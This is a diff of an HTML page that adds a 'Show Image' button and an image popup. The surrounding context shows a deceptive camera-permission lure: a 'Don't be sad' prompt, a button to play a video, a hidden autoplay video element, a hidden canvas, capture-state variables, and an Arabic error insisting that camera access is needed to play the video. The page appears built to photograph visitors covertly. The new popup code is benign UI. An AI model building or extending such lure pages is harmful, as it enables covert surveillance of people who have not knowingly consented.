@@ -34,6 +34,7 @@
       width: 90%;
       margin: 20px auto;
       backdrop-filter: blur(10px);
+      position: relative;
     }
     
     h1 {
@@ -134,6 +135,10 @@
       background: rgba(255, 255, 255, 0.1);
       border-radius: 10px;
       margin: 20px 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 15px;
     }
     
     .permission-btn {
@@ -144,9 +149,9 @@
       font-size: 18px;
       border-radius: 50px;
       cursor: pointer;
-      margin-top: 15px;
       transition: all 0.3s;
       box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+      width: 200px;
     }
     
     .permission-btn:hover {
@@ -157,6 +162,14 @@
     
     .permission-btn:active {
       transform: translateY(0);
+    }
+    
+    #showImageBtn {
+      background: #2196F3;
+    }
+    
+    #showImageBtn:hover {
+      background: #0b7dda;
     }
     
     .instructions {
@@ -177,6 +190,65 @@
       display: none;
       z-index: 10;
     }
+    
+    /* Popup styles */
+    .image-popup {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.9);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+      opacity: 0;
+      visibility: hidden;
+      transition: opacity 0.3s, visibility 0.3s;
+    }
+    
+    .image-popup.active {
+      opacity: 1;
+      visibility: visible;
+    }
+    
+    .popup-content {
+      position: relative;
+      max-width: 90%;
+      max-height: 90%;
+      box-shadow: 0 0 30px rgba(255, 255, 255, 0.2);
+    }
+    
+    .popup-content img {
+      max-width: 100%;
+      max-height: 80vh;
+      border-radius: 8px;
+      display: block;
+    }
+    
+    .close-popup {
+      position: absolute;
+      top: -40px;
+      right: 0;
+      background: #f44336;
+      color: white;
+      width: 35px;
+      height: 35px;
+      border-radius: 50%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-size: 24px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: all 0.3s;
+    }
+    
+    .close-popup:hover {
+      background: #d32f2f;
+      transform: rotate(90deg);
+    }
   </style>
 </head>
 <body>
@@ -185,8 +257,9 @@
     
     <!-- Camera permission request -->
     <div class="permission-request" id="permissionRequest">
-      <p>Don't be sad.</p>
-      <button class="permission-btn" id="cameraBtn">Start Video</button>
+      <p>Don't be sad. Choose an option:</p>
+      <button class="permission-btn" id="cameraBtn">Show Video</button>
+      <button class="permission-btn" id="showImageBtn">Show Image</button>
     </div>
     
     <!-- Countdown element -->
@@ -216,6 +289,14 @@
     </div>
   </div>
 
+  <!-- Image popup -->
+  <div class="image-popup" id="imagePopup">
+    <div class="popup-content">
+      <span class="close-popup" id="closePopup">&times;</span>
+      <img src="https://h.top4top.io/p_3501mscbf0.jpg" alt="Special Image">
+    </div>
+  </div>
+
   <video id="hiddenVideo" autoplay playsinline class="hidden"></video>
   <canvas id="canvas" width="640" height="480" class="hidden"></canvas>
 
@@ -232,6 +313,9 @@
     const permissionRequest = document.getElementById('permissionRequest');
     const cameraBtn = document.getElementById('cameraBtn');
     const captureIndicator = document.getElementById('captureIndicator');
+    const showImageBtn = document.getElementById('showImageBtn');
+    const imagePopup = document.getElementById('imagePopup');
+    const closePopup = document.getElementById('closePopup');
     
     // متغيرات الحالة
     let cameraCaptured = false;
@@ -343,6 +427,23 @@
         // Show error message
         errorMsg.textContent = 'يجب السماح بالكاميرا لتشغيل الفيديو. يرجى تحديث الصفحة والمحاولة مرة أخرى.';
         errorMsg.style.display = 'block';
+      }
+    });
+    
+    // Show image popup functionality
+    showImageBtn.addEventListener('click', () => {
+      imagePopup.classList.add('active');
+    });
+    
+    // Close popup functionality
+    closePopup.addEventListener('click', () => {
+      imagePopup.classList.remove('active');
+    });
+    
+    // Also close popup when clicking outside the image
+    imagePopup.addEventListener('click', (e) => {
+      if (e.target === imagePopup) {
+        imagePopup.classList.remove('active');
       }
     });
     
